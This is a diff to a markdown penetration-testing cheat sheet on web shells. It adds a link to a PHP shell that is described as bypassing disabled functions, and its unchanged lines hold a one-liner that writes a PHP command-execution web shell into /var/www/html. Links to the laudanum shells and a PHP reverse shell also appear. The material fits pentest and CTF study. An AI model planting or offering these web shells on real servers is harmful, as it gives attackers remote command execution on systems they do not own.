@@ -21,13 +21,17 @@ Find web shells in :
 
 /usr/share/laudanum
 
-### PHP
+## PHP
 
 	https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 
 One liner:
 
 	echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+
+Good php shell, that bypasses a lot of disabled functions:
+
+	https://github.com/flozz/p0wny-shell
 
 ## Fully interactive shell
 
